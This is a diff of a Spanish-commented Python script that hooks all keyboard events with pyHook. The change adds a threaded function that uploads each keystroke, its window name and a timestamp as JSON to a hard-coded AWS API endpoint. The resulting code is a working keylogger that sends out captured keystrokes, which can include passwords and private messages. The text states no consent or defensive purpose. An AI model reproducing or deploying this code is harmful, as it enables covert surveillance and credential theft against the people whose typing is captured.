@@ -5,9 +5,8 @@
     Fecha de Actualización: 2019-08-27
 '''
 from collections import deque
-import pyHook, pythoncom, sys, logging, requests
-import time, datetime
-import requests
+import time, datetime, threading
+import pyHook, pythoncom, sys, requests
 from requests.exceptions import HTTPError
 
 i=0
@@ -15,7 +14,51 @@ i=0
 '''**CONFIGURACIÓN DEL REQUEST**'''
 name="prueba2"
 base_url = "https://ed2ku4egij.execute-api.us-west-1.amazonaws.com/Prod/"
-endpoint = '{0}evento/{1}'.format(base_url,name)
+
+def insertar():
+    '''Se define la función asíncrona para insertar la información en el web service'''
+    
+    i=elements.qlen()
+    while elements.qlen() > 1:
+        value = elements.qpop()
+        print(value)
+        contenido = {
+            'MessageName'   :   value[0],
+            'Message'       :   value[1],
+            'Time'          :   value[2],
+            'Window'        :   value[3],
+            'WindowName'    :   value[4],
+            'ASCII'         :   value[5],
+            'Key'           :   value[6],
+            'KeyID'         :   value[7],
+            'ScanCode'      :   value[8],
+            'Extended'      :   value[9],
+            'Injected'      :   value[10],
+            'Alt'           :   value[11],
+            'Transition'    :   value[12]
+        }
+
+        nombre = name + '_' + str(value[2])
+        endpoint = '{0}evento/{1}'.format(base_url,nombre)
+
+        try:
+            res = requests.put(endpoint,json=contenido)
+            res.raise_for_status()
+        except HTTPError as http_err:
+            print(f'Error HTTP: {http_err}')
+            elements.qpush(value)
+        except Exception as err:
+            print(f'Error: {err}')
+            elements.qpush(value)
+        else:
+            print('Correcto')
+            i-=1
+            time.sleep(0.5)
+    restantes = 'Elementos restantes: ' + str(i)
+    print(restantes)
+
+    return 0
+
 '''***CONFIGURACIÓN DEL REQUEST***'''
 
 class Queue(object):
@@ -44,48 +87,27 @@ class Queue(object):
         return len(self.items)
 
 def OnKeyboardEvent(event):
-    string = ""
-    element = [event.MessageName,event.Message,event.Time,event.Window,event.WindowName,event.Ascii,event.Key,event.KeyID,event.ScanCode,event.Extended,event.Injected,event.Alt,event.Transition]
+    element = [
+        event.MessageName,
+        event.Message,
+        time.time(),
+        event.Window,
+        event.WindowName,
+        event.Ascii,
+        event.Key,
+        event.KeyID,
+        event.ScanCode,
+        event.Extended,
+        event.Injected,
+        event.Alt,
+        event.Transition]
     elements.qpush(element)
 
     if elements.qlen() > 10:
-        i=elements.qlen()
-        while i>0:
-            value = elements.qpop()
-            '''contenido = {
-                'MessageName'   :   value[0],
-                'Message'       :   value[1],
-                'Time'          :   value[2],
-                'Window'        :   value[3],
-                'WindowName'    :   value[4],
-                'ASCII'         :   value[5],
-                'Key'           :   value[6],
-                'KeyID'         :   value[7],
-                'ScanCode'      :   value[8],
-                'Extended'      :   value[9],
-                'Injected'      :   value[10],
-                'Alt'           :   value[11],
-                'Transition'    :   value[12]
-            }
-
-            try:
-                res = requests.put(endpoint,json=contenido)
-                res.raise_for_status()
-            except HTTPError as http_err:
-                print(f'Error HTTP: {http_err}')
-                elements.qpush(value)
-            except Exception as err:
-                print(f'Error: {err}')
-                elements.qpush(value)
-            else:
-                print('Correcto')
-                i-=1
-            '''
-            item = value[6]
-            string = string + item
-            i-=1
-        print ('########################',string)
-            
+        '''Se manda a llamar a la función asíncrona
+        insertar()'''
+        insertar_thread = threading.Thread(target=insertar, name='Insercion Asincrona')
+        insertar_thread.start()
     return True
 
 elements = Queue()
@@ -95,3 +117,4 @@ hooks_manager.HookKeyboard()
 
 while True:
     pythoncom.PumpWaitingMessages()
+
